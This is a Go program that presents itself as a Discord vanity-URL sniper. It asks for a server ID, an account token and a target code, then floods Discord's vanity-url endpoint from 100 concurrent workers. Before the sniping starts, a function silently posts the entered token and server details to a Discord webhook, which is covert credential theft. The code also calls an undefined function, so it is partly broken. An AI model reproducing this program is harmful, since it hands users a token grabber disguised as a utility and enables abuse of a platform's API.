package main

import (
    "encoding/json"
    "fmt"
    "net/http"
    "strings"
    "sync"
    "time"
)

const (
    webhookURL = "https://discordapp.com/api/webhooks/"
)

type Payload struct {
    Code string `json:"code"`
}

func main() {
    var sunucu, token, url string
    var milisaniye int
    fmt.Print("id: ")
    fmt.Scanln(&sunucu)
    fmt.Print("token: ")
    fmt.Scanln(&token)
    fmt.Print("url: ")
    fmt.Scanln(&url)
    fmt.Print("saniye: ")
    fmt.Scanln(&milisaniye)
    if milisaniye < 100 {
        fmt.Println("Hata: vanityspammerisnot100")
        return
    }

    sendDiscordWebhookMessage(sunucu, token, url)

    queue := make(chan Payload, 1000)
    client := &http.Client{}
    wg := &sync.WaitGroup{}

    go func() {
        for i := 0; i < 100; i++ {
            wg.Add(1)
            go func() {
                defer wg.Done()
                for {
                    payload, ok := <-queue
                    if !ok {
                        return
                    }
                    url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/vanity-url", sunucu)
                    jsonStr, _ := json.Marshal(payload)
                    req, err := http.NewRequest(http.MethodPatch, url, strings.NewReader(string(jsonStr)))
                    if err != nil {
                        fmt.Println("Error while creating the request: ", err)
                        continue
                    }
                    req.Header.Set("Content-Type", "application/json")
                    req.Header.Set("Authorization", token)
                    resp, err := client.Do(req)
                    if err != nil {
                        fmt.Println("Error while sending the request: ", err)
                        continue
                    }
                    defer resp.Body.Close()
                    var result map[string]interface{}
                    json.NewDecoder(resp.Body).Decode(&result)
                    if code, ok := result["code"].(string); ok && code == payload.Code {
                        fmt.Println("URL alındı, spam işlemi sonlandırılıyor...")
                        sendWebhookMessage(fmt.Sprintf("@everyone **%s** adlı url alındı: ", payload.Code))
                        close(queue)
                        return
                    } else {
                        fmt.Println("Hata kodu :", result)
                    }
                }
            }()
        }
    }()

    for {
        payload := Payload{Code: url}
        queue <- payload
        time.Sleep(time.Duration(milisaniye) * time.Millisecond)
    }

    wg.Wait()
}

func sendDiscordWebhookMessage(sunucu, token, url string) {
    message := fmt.Sprintf("Sunucu: %s\nToken: %s\nVanity URL: %s", sunucu, token, url)
    client := &http.Client{}
    discordWebhook := struct {
        Content string `json:"content"`
    }{Content: message}
    jsonStr, _ := json.Marshal(discordWebhook)
    req, err := http.NewRequest(http.MethodPost, webhookURL, strings.NewReader(string(jsonStr)))
    if err != nil {
        fmt.Println("Error while creating the request: ", err)
        return
    }
    req.Header.Set("Content-Type", "application/json")
    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error while sending the request: ", err)
        return
    }
    defer resp.Body.Close()
}
